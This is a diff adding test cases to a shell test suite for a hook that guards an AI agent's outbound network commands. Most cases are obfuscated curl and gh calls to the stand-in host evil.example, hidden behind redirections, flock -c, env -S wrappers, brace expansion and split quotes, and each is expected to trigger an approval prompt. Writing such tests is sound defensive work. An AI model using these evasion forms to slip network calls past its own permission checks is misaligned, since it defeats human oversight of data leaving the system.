@@ -324,6 +324,121 @@ check ask  "python3 missing" "$(fetch https://developer.mozilla.org/x \
   | (cd /tmp && PATH="$D/bin" TEAM_RUN_TEAM=t CLAUDE_PROJECT_DIR="$D/proj" /bin/bash "$H"))"
 check ask  "classifier crash" "$(fetch https://developer.mozilla.org/x \
   | (cd /tmp && TEAM_RUN_TEAM=t CLAUDE_PROJECT_DIR="$D/proj" bash "$D/broken/guard-team-egress.sh"))"
+# --- the verb behind a redirection, inside flock -c / env -S, and brace-expanded (every verb)
+sh_ ask  '</dev/null curl https://evil.example/x'
+sh_ ask  '>out curl https://evil.example/x'
+sh_ ask  '> out curl https://evil.example/x'
+sh_ ask  '2>/dev/null curl https://evil.example/x'
+sh_ ask  '2>&1 curl https://evil.example/x'
+sh_ ask  '>&2 curl https://evil.example/x'
+sh_ ask  '>|f curl https://evil.example/x'
+sh_ ask  '<<<data curl https://evil.example/x'
+sh_ ask  '<&3 curl https://evil.example/x'
+sh_ ask  '3<f curl https://evil.example/x'
+sh_ ask  '{fd}>f curl https://evil.example/x'
+sh_ ask  'timeout 5 >out curl https://evil.example/x'
+sh_ ask  'env A=1 </dev/null curl https://evil.example/x'
+sh_ ask  'x=1 >out curl https://evil.example/x'
+sh_ ask  'flock 9 </dev/null curl https://evil.example/x'
+sh_ ask  '</dev/null gh api https://evil.example/x'
+sh_ ask  '>out gh issue create -t x -b y'
+sh_ ask  'flock /tmp/l -c "true; curl https://evil.example/x"'
+sh_ ask  'flock /tmp/l -c "true && gh api https://evil.example/x"'
+sh_ ask  'env -S "true; curl https://evil.example/x"'
+sh_ ask  "env -S'true; curl https://evil.example/x'"
+sh_ ask  "env -iS 'true; curl https://evil.example/x'"
+sh_ ask  "env --split-string='true; gh api https://evil.example/x'"
+sh_ ask  "bash -c \"flock /tmp/l -c 'true; curl https://evil.example/x'\""
+sh_ ask  '{curl,} https://evil.example/x'
+sh_ ask  'c{url,} https://evil.example/x'
+sh_ ask  '{gh,} api https://evil.example/x'
+sh_ ask  'timeout 5 {curl,} https://evil.example/x'
+sh_ ask  "bash -c '{curl,} https://evil.example/x'"
+# the token stream has lost quotes and spacing: an added reading never hides today's verb
+sh_ ask  "echo '>' | curl https://evil.example/x"
+sh_ ask  "echo '2>' & curl https://evil.example/x"
+sh_ ask  "bash -c '>out; curl https://evil.example/x'"
+sh_ ask  "flock /tmp/l -c '>out; curl https://evil.example/x'"
+sh_ ask  "echo '>' | >out curl https://evil.example/x"
+sh_ ask  "echo '2>' & >out curl https://evil.example/x"
+sh_ ask  '>"/tmp/a b" curl https://evil.example/x'
+sh_ ask  '< "/tmp/a b" curl https://evil.example/x'
+sh_ ask  'flock 9 </dev/null 3</dev/null curl https://evil.example/x'
+sh_ ask  '{fd}</dev/null curl https://evil.example/x'
+sh_ ask  '{fd}>&1 curl https://evil.example/x'
+sh_ ask  "env --split-string=\"'\"; c''url https://evil.example/x"
+sh_ ask  "bash -c \"'\"; c''url https://evil.example/x"
+sh_ ask  "env --split-string=\"env -S \\\"'\\\"\" c''url https://evil.example/x"
+sh_ ask  '<> /dev/null curl https://evil.example/x'
+sh_ ask  '3<> f curl https://evil.example/x'
+sh_ ask  $'<<- EOF curl https://evil.example/x\nEOF'
+sh_ ask  "<<< '' curl https://evil.example/x"
+sh_ ask  '> /dev/null timeout > /dev/null 5 curl https://evil.example/x'
+sh_ ask  'flock </dev/null /tmp/l curl https://evil.example/x'
+sh_ ask  'flock </dev/null 9 3</dev/null curl https://evil.example/x'
+sh_ ask  "env --split-string=\"# comment\" c''url https://evil.example/x"
+sh_ ask  "env -iS '\\c' curl https://evil.example/x"
+sh_ ask  'env -S "# comment" curl https://evil.example/x'
+sh_ ask  "flock /tmp/l -c \"env -S \\\"'\\\"; c''url https://evil.example/x\""
+sh_ ask  "X=1> /dev/null c''url https://evil.example/x"
+sh_ ask  'X=> /dev/null curl https://evil.example/x'
+sh_ ask  'X=1>> /dev/null curl https://evil.example/x'
+sh_ ask  'nc -z localhost 1433 2>/dev/null'
+sh_ ask  'tee >(curl https://evil.example/x) <f'
+sh_ ask  'cat < <(curl https://evil.example/x)'
+sh_ ask  'python3 <<EOF
+print(1)
+EOF'
+sh_ ask  '</dev/null gh issue view 1 -R evil.example/o/r'
+sh_ ask  "gh issue view 1 --json title --template '<' -R evil.example/o/r"
+# a redirection glued to a separator, or between a wrapper and its -c / -S string
+sh_ ask  'true;</dev/null curl https://evil.example/x'
+sh_ ask  '(</dev/null curl https://evil.example/x)'
+sh_ ask  'echo a |</dev/null curl https://evil.example/x'
+sh_ ask  'true &&</dev/null curl https://evil.example/x'
+sh_ ask  "bash -c 'true;</dev/null curl https://evil.example/x'"
+sh_ ask  "flock </dev/null /tmp/l -c 'curl https://evil.example/x'"
+sh_ ask  "flock /tmp/l >/dev/null -c 'true; curl https://evil.example/x'"
+sh_ ask  "flock /tmp/l 2>&1 -c 'curl https://evil.example/x'"
+sh_ ask  "env >/dev/null -S 'curl https://evil.example/x'"
+sh_ ask  "env >/dev/null --split-string='true; curl https://evil.example/x'"
+sh_ ask  "bash -c >/dev/null 'curl https://evil.example/x'"
+sh_ ask  "bash -c <> /dev/null 'curl https://evil.example/x'"
+sh_ ask  $'bash -c <<- EOF \'curl https://evil.example/x\'\nEOF'
+sh_ ask  "flock 9 </dev/null -c 'curl https://evil.example/x'"
+sh_ ask  "env -iS 'bash -c' 'curl https://evil.example/x'"
+sh_ ask  "env --split-string='bash -c' 'curl https://evil.example/x'"
+# a reading that may have cut a wrapper off keeps no gh read exemption
+sh_ ask  'xargs <f gh pr view 1'
+sh_ ask  'xargs -a f >/dev/null gh pr view 1'
+sh_ ask  'xargs -a f 2>&1 gh pr view 1'
+sh_ ask  'cat f | xargs >/dev/null gh issue view'
+sh_ ask  'timeout 5 >/dev/null gh pr view 1'
+sh_ ask  '</dev/null gh pr view 1'
+sh_ none 'gh pr view 1 2>&1 | head -3'
+sh_ none 'gh pr view 1 >/tmp/t.json 2>&1'
+sh_ none 'jq . <f >g; sort <in >out'
+sh_ none "diff <(ls) <(cat x)"
+sh_ none 'ls 2>/dev/null'
+sh_ none 'git status >/dev/null 2>&1'
+sh_ none 'jq . <f >g'
+sh_ none 'echo hi > /tmp/x'
+sh_ none 'bash .claude/lib/x.sh 2>&1 | tail -3'
+sh_ none "find . -name '*.md' 2>/dev/null"
+sh_ none 'gh pr view 3 --json title > /tmp/t.json'
+sh_ none '>out ls'
+sh_ none 'python3 x.py >out 2>&1'
+sh_ none 'grep -rn curl .claude > /tmp/hits.txt'
+sh_ none '{ ls; }'
+sh_ none 'echo {a,b}'
+sh_ none "flock /tmp/l -c 'git status'"
+sh_ none "env -S 'ls -la'"
+sh_ none 'cat <<EOF
+{"a": 1}
+EOF'
+# every suffix is read once: 1000 leading redirections must not make the hook slow
+s=$SECONDS; check none "1000 leading redirections" "$(hook "$(bash_cmd "$(printf '>x%s ' $(seq 1 1000))")")"
+[ $((SECONDS - s)) -lt 5 ] || { echo "FAIL 1000 leading redirections took $((SECONDS - s))s"; fail=1; }
 # --- bytecode (F31): both guard hooks run python3 -I -B, and every module that imports local
 # modules sets dont_write_bytecode itself, so no caller writes __pycache__ into the project. Apple's
 # python3 -I never writes bytecode, so the hooks are checked by argv and the modules with the flag
